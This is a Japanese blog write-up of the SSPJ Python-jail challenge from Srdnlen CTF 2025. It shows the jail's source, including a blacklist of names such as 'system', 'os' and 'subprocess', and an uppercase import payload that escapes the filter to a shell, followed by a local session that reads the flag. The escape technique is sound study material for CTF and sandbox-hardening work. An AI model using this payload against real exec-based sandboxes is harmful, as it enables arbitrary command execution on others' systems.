+++
author = "Hugo Authors"
title = "Srdnlen CTF 2025"
date = "2025-01-15"
description = ""
tags = [
    "CTF",
    "writeup",
    "srdnlen",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/srdnlen-ctf-2025/cover.png"
+++

2025/1/19 03:00(JST) - 2025/1/20 03:00(JST)で開催された Srdnlen CTF 2025 に参加した．

<!--more-->
開催期間後に解いた問題をまとめる．

https://ctf.srdnlen.it/
https://ctftime.org/event/2576

## MISC
### SSPJ 
> nc ~

サニタイズされた任意のコマンドを実行できるPyjail, PyExec問題．いくつかのアルファベットや記号，単語は使えない．

```py
class SSPJ(object):
    def __init__(self):
        print("Welcome to the Super Secure Python Jail (SSPJ)!")
        print("You can run your code here, but be careful not to break the rules...")

        self.code = self.code_sanitizer(input("Enter your data: "))

        # I'm so confident in my SSPJ that 
        # I don't even need to delete any globals/builtins
        exec(self.code, globals())
        return

    def code_sanitizer(self, code: str) -> str:
        if not code.isascii():
            print("Alien material detected... Exiting.")
            exit()

        banned_chars = [
            # Why do you need these characters?
            "m", "o", "w", "q", "b", "y", "u", "h", "c", "v", "z", "x", "k"
        ]

        banned_digits = [
            # Why do you need these digits?
            "0", "7", "1"
        ]

        banned_symbols = [
            # You don't need these...
            ".", "(", "'", "=", "{", ":", "@", '"', "[", "`"
        ]

        banned_words = [
            # Oh no, you can't use these words!
            "globals", "breakpoint", "locals", "self", "system", "open",
            "eval", "import", "exec", "flag", "os", "subprocess", "input",
            "random", "builtins", "code_sanitizer"
        ]

        blacklist = banned_chars + banned_digits + banned_symbols + banned_words
        random.shuffle(blacklist)

        if any(map(lambda c: c in code, blacklist)):
            print("Are you trying to cheat me!? Emergency exit in progress.")
            exit()

        return code.lower()
```

Pyjail, PyExec問題では，[Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet)によくまとまっている．
今回は，以下が使える．
```
from os import system as __getattr__; from __main__ import sh
```
アルファベットの小文字の一部がサニタイズされているため，そのままでは上手くいかない．全て大文字で上手くいく．
```
FROM OS IMPORT SYSTEM AS __GETATTR__; FROM __MAIN__ IMPORT SH
```

今回は，開催期間後にローカルで実行した様子を示す．
```
$ docker-compose up
$ nc 127.0.0.1 1717
Welcome to the Super Secure Python Jail (SSPJ)!
You can run your code here, but be careful not to break the rules...
Enter your data: FROM OS IMPORT SYSTEM AS __GETATTR__; FROM __MAIN__ IMPORT SH

ls
flag-5d67dabaeb377feb4e8f79f80dd546f9.txt
sspj.py

cat flag-5d67dabaeb377feb4e8f79f80dd546f9.txt
srdnlen{REDACTED}
```
